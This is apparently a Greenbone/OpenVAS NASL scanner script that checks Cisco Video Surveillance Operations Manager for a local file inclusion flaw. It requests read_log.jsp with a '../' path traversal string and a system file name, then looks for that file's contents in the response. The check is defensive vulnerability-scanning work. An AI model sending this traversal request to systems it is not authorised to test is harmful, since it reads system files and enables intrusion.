# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only
CPE = 'cpe:/a:cisco:video_surveillance_manager';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103678");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_name("Cisco Video Surveillance Operations Manager Multiple vulnerabilities");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120790/Cisco-Video-Surveillance-Operations-Manager-6.3.2-XSS-LFI-Bypass.html");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-03-14 17:43:31 +0100 (Thu, 14 Mar 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("CISCO");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_cisco_video_surveillance_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cisco_video_surveillance_manager/installed");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Cisco Video Surveillance Operations Manager is prone to:

  1. A Local file inclusion vulnerability.
  2. An XSS vulnerability.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))exit(0);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  url = '/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../' + file;

  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url( port:port, url:url );
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
